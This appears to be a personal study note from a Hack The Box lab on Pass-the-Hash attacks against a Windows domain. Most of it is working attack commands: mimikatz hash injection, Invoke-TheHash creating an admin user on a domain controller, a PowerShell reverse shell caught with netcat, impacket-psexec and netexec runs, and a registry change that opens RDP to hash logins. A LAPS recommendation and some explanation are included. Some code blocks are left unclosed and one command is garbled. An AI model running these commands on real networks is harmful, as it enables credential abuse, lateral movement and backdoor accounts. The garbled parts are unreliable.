### pass the hash as to create shell in the context of another domain user and access a private share:
this situation where even as whoami -> david had no acesss to //dc01/david

```cmd-session
c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:david /ntlmm rc4>:c39f2beb3d2ec06a62cb887fb391dee0 /domain:inlanefreight.htb /run:cmd.exe" exit
```

## PTH with powershell

#### Invoke-TheHash tool:

create and add a user to admins group on DC
```
PS c:\htb> cd C:\tools\Invoke-TheHash\
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```

#### reverse shell
```powershell
PS C:\tools> .\nc.exe -lvnp 8001

listening on [any] 8001 ...
```

get a reverse shell with https://revshells.com
```powershell
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e <b64shell>

#### with impacket on linux
```shell-session
$ impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453

There are several other tools in the Impacket toolkit we can use for command execution using Pass the Hash attacks, such as:

- [impacket-wmiexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)
- [impacket-atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py)
- [impacket-smbexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py)

### netexec
```shell-session
netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
```

If we want to perform the same actions but attempt to authenticate to each host in a subnet using the local administrator password hash, we could add `--local-auth` to our command. This method is helpful if we obtain a local administrator hash by dumping the local SAM database on one host and want to check how many (if any) other hosts we can access due to local admin password re-use. If we see `Pwn3d!`, it means that the user is a local administrator on the target computer. We can use the option `-x` to execute commands. It is common to see password reuse against many hosts in the same subnet.


a great recommendation for the customer is to implement the [Local Administrator Password Solution (LAPS)](https://www.microsoft.com/en-us/download/details.aspx?id=46899), which randomizes the local administrator password and can be configured to have it rotate on a fixed interval.


# EXECUTE COMMANDS WITH NETEXEC
```shell-session
$ netexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
```

We can perform an RDP PtH attack to gain GUI access to the target system using tools like `xfreerdp`.

There are a few caveats to this attack:

- `Restricted Admin Mode`, which is disabled by default, should be enabled on the target host; otherwise, you will be presented with the following error:

![Error message: Account restrictions prevent signing in due to blank passwords, limited sign-in times, or policy restrictions.](https://academy.hackthebox.com/storage/modules/308/img/rdp_session-4.png)

This can be enabled by adding a new registry key `DisableRestrictedAdmin` (REG_DWORD) under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa` with the value of 0. It can be done using the following command:

#### Enable Restricted Admin Mode to allow logging as admin

```cmd-session
c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

![Registry Editor showing path to Lsa with DisableRestrictedAdmin set to 0.](https://academy.hackthebox.com/storage/modules/308/img/rdp_session-5.png)

Once the registry key is added, we can use `xfreerdp` with the option `/pth` to gain RDP access:
## UAC limits Pass the Hash for local accounts

UAC (User Account Control) limits local users' ability to perform remote administration operations. When the registry key `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy` is set to 0, it means that the built-in local admin account (RID-500, "Administrator") is the only local account allowed to perform remote administration tasks. Setting it to 1 allows the other local admins as well.

**Note:** There is one exception, if the registry key `FilterAdministratorToken` (disabled by default) is enabled (value 1), the RID 500 account (even if it is renamed) is enrolled in UAC protection. This means that remote PTH will fail against the machine when using that account.

These settings are only for local administrative accounts. If we get access to a domain account with administrative rights on a computer, we can still use Pass the Hash with that computer. If you want to learn more about LocalAccountTokenFilterPolicy, you can read Will Schroeder's blog post [Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy](https://posts.specterops.io/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy-506c25a7c167).
